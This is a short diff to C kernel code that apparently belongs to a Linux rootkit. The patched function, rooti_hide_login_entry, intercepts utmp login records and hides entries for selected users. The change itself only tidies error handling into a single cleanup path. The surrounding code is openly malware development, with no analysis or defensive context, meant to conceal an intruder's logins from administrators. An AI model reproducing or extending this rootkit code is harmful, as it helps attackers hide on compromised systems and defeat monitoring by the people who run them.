@@ -75,8 +75,8 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
     ret = copy_from_user(kernel_buf, user_buf, count);
     if (ret > 0) {
         ROOTI_DEBUG("copy_from_user() failed: %d", ret);
-        kfree(kernel_buf);
-        return -EFAULT;
+        ret = -EFAULT;
+        goto out;
     }
 
     if (rooti_should_hide_user(utmp_buf->ut_user)) {
@@ -86,11 +86,13 @@ int rooti_hide_login_entry(char *user_buf, size_t count)
         ret = copy_to_user(user_buf, kernel_buf, count);
         if (ret > 0) {
             ROOTI_DEBUG("copy_to_user() failed: %d", ret);
-            kfree(kernel_buf);
-            return -EFAULT;
+            ret = -EFAULT;
+            goto out;
         }
     }
+    ret = 0;
 
+out:
     kfree(kernel_buf);
-    return 0;
+    return ret;
 }
